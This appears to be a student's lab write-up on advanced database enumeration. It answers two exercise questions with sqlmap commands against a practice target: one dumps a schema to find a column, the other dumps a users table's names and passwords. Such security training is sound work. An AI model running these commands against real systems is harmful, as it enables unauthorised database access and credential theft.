# [Advanced Database Enumeration](Advanced%20Database%20Enumeration.md)
### What's the name of the column containing "style" in it's name? (Case #1)

```shell
sqlmap -u 'http://154.57.164.74:31979/case1.php?id=1' --schema | grep -i 'style' -B 5
```
![](Screenshot%202026-06-23%20at%2013.21.33.png)
### What's the Kimberly user's password? (Case #1)

```shell
sqlmap -u 'http://154.57.164.74:31979/case1.php?id=1' -D testdb -T users -C name,password --dump
```
![](Screenshot%202026-06-23%20at%2013.27.29.png)
